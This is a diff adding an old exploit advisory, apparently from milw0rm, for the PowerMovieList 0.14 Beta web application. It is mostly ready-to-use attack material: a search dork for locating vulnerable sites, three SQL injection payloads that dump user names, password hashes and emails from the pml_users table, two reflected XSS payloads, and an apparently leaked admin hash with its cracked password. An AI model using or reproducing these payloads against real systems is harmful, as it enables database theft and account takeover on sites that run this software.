@@ -1,0 +1,55 @@
+===============================================================================================
+
+Found : brain[pillow]
+Dork  : "PowerMovieList 0.14 Beta Copyright"
+Visit : brainpillow.cc, forum.antichat.ru, raz0r.name
+Mail  : brainpillow@gmail.com
+
+===============================================================================================
+
+        SQL-injection # 1
+        Need:   1) magic quotes = off
+                2) need to be logined as registered user
+        Example:
+        
+/edituser.php?Active=index&action=details&ID=-850'+union+select+0,name,1,pass,3,4,5,6,7,8,9,10,11,12,13,14,15+from+pml_users+limit+1,1/*
+
+Admin:69756f3cd326cb18036b1cb8f8e9f77f:torch
+
+===============================================================================================
+
+        SQL-injection # 2
+        Need:   magic quotes = off
+        Note:   i'm lazy to check what info is send to the email in result
+                of such packet, but this injection seems to be blind.
+        Example:
+        
+POST /activate.php?action=resendsave HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+
+ReSendUser=cekac' union select 0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6#
+
+===============================================================================================
+
+        SQL-injection # 3
+        Need:   magic quotes = off
+        Example:
+
+/list.php?Active=INTERNET_OPASNOSTE'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,concat_ws(char(58),name,pass,email,icq),23,24,25,26,27,28,29,30,31,32,33+from+pml_users+where+name='admin'+and+1='1
+
+===============================================================================================
+
+        Passive XSS
+        Examples:
+
+1) /edituser.php?Active=index&Display=&&action=<h1>onotole power</h1>
+
+2) /edituser.php?Active=index&Display=&action=&F=&fltname='><h1>upyachka,upyachka</h1><div style=display:none>
+
+
+===============================================================================================
+
+# milw0rm.com [2009-02-16]
